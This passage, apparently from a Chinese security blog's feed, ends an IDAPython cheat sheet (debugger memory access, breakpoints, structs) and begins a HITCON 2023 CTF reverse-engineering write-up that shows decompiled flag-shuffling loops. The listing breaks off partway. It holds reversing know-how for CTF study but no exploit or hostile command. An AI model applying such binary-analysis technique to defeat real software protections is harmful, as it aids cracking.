data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>​       idaapi<span class=\"token punctuation\">.</span>get_reg_val<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> rv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>​       <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'Q'</span><span class=\"token punctuation\">,</span> rv<span class=\"token punctuation\">.</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>调试内存操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_memory<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_dword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_dbg_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>调试内存读写封装</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">patch_dbg_mem</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>​       <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>​             idc<span class=\"token punctuation\">.</span>patch_dbg_byte<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read_dbg_mem</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>​       dd <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>​       <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>​             dd<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idc<span class=\"token punctuation\">.</span>read_dbg_byte<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>​        <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>dd<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地内存操作（会修改 idb 数据库）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_dword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_word<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_db_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_bytes<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>反汇编操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GetDisasm<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取反汇编文本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>next_head<span class=\"token punctuation\">(</span>ea<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 获取下一条指令地址</span></pre></td></tr></table></figure><p>杂项常用接口</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>add_bpt<span class=\"token punctuation\">(</span><span class=\"token number\">0x409437</span><span class=\"token punctuation\">)</span> 添加断点</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idaapi<span class=\"token punctuation\">.</span>get_imagebase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 获取基地址</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>create_insn<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># c, Make Code</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ida_funcs<span class=\"token punctuation\">.</span>add_func<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># p , create function</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ida_bytes<span class=\"token punctuation\">.</span>create_strlit<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 创建字符串，A 键效果</span></pre></td></tr></table></figure><p>条件断点脚本编写</p>\n<ol start=\"0\">\n<li>\n<p>编写断点函数脚本，并在 IDA 底部导入该函数</p>\n</li>\n<li>\n<p>设置普通断点，在 call rand 之后设置（此时能获取 rand 的返回值）</p>\n</li>\n<li>\n<p>[右键] -&gt; [Edit Break …]</p>\n</li>\n<li>\n<p>点击 [Condition]-&gt;  […]</p>\n</li>\n<li>\n<p>输入 bp () ，并选择语言为 Python</p>\n</li>\n</ol>\n<p>条件断点运用：提取 rand 函数每一次执行结果，不让程序停下来<br>\n条件断点函数返回 False，IDA 不会命中该断点<br>\n利用这个特性可提取运行时数据</p>\n<p>注：若设置条件断点 在 idapython 脚本中未设置断下来的条件 (通俗的说法), 只是 print 的话运行时是不会断的</p>\n<p><strong>创建结构体</strong></p>\n<p>打开创建结构体的 Subview，点击工具栏 View-&gt;Open Subview-&gt;Structures ( <strong>Shift + F9</strong>)。</p>\n<p>按键盘 I 弹出结构体的创建窗口，输入 Structure name。</p>\n<p>在结构体的 ends 行，按键盘  <code>d</code>  键，创建新的结构体成员。</p>\n<p>在结构体成员初按  <code>d</code>  键，修改数据类型（db dw dd dq），右键点击 Array 可以创建数组。</p>\n<p>最后，分析代码。确定结构体中的成员在反汇编代码中的名称。之后，修改反编译代码中该 成员的类型，按  <code>y</code>  修改为 struct name（这里修改为 student）。</p>\n<p><strong>Local Types</strong> 修改方便！</p>\n<p>参考:<span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGlua3ljeC5tZS8yMDE5LTA3LTE1LWhvdy10by1jcmVhdGUtc3RydWN0cy1pbi1JREEuaHRtbA==\">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</span></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/11/hitcon2023%E9%80%86%E5%90%91-The-Blade-WP/",
            "url": "https://3cly.github.io/2023/09/11/hitcon2023%E9%80%86%E5%90%91-The-Blade-WP/",
            "title": "hitcon2023逆向 The Blade WP",
            "date_published": "2023-09-10T16:35:32.000Z",
            "content_html": "<h1 id=\"hitcon2023逆向-the-blade-wp\"><a class=\"markdownIt-Anchor\" href=\"#hitcon2023逆向-the-blade-wp\">#</a> hitcon2023 逆向 The Blade WP</h1>\n<p><img data-src=\"/images/image-20230908230559788.png\" alt=\"image-20230908230559788\"></p>\n<p>运行所给的程序 socket 通信相关</p>\n<p><img data-src=\"/images/image-20230909162510993.png\" alt=\"image-20230909162510993\"></p>\n<p><img data-src=\"/images/image-20230910145732886.png\" alt=\"image-20230910145732886\"></p>\n<p>由题目描述 A Rust tool for executing shellcode in a seccomp environment.</p>\n<p>字符串查找定位 发现其中 verify 方法可疑</p>\n<p><img data-src=\"/images/image-20230910150509237.png\" alt=\"image-20230910150509237\"></p>\n<p>发现隐藏了一个命令 flag 是以添加命令行参数的方式输入 flag 调试得知输入 flag 长度为 64 位</p>\n<p><img data-src=\"/images/image-20230909181940256.png\" alt=\"image-20230909181940256\"></p>\n<p>F7 进入 verify 发现加密逻辑 简单来讲 是一个大的 256 次 while 循环 里面有好几个通过固定的表对输入进行打乱，然后一个有点复杂的加密逻辑，有取余有除有异或，于是就有个骚操作的想法，既然逆向加密算法比较复杂，就找出 00-ff 的映射就行了 因为是按位加密的伐然后前面的几次打乱顺序由于是固定的表所以可以看成一次打乱顺序 找出索引交换的顺序即可</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token operator\">++</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    v9 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    v10 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      v11 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v11 <span class=\"token operator\">>=</span> <span class=\"token number\">64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v12 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v11<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> flagg<span class=\"token punctuation\">[</span>v11<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v12<span class=\"token punctuation\">,</span> v13 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v10<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v10 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>LABEL_53<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        core<span class=\"token operator\">::</span>panicking<span class=\"token operator\">::</span>panic_bounds_check<span class=\"token operator\">::</span><span class=\"token function\">h7d0e683548e4cb10</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v14 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v13<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v13<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      v10 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      v9 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v9 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745E9D20<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    v15 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    v16 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      v17 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v17 <span class=\"token operator\">></span> <span class=\"token number\">63</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      v18 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v18<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      v19 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v16 <span class=\"token operator\">></span> <span class=\"token number\">63</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      v20 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v19<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v19<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v20<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      v16 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      v15 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v15 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745E9F20<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    v21 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    v22 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      v23 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v22 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v23 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      v24 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v23<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v23<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v24<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      v25 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v22<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v22 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>      v26 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v26<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      v22 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      v21 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v21 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA120<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    v27 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    v28 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>      v29 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v28 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v29 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>      v30 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v29<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v29<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>      v31 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v28<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v28 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>      v32 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v31<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v31<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>      v28 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>      v27 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 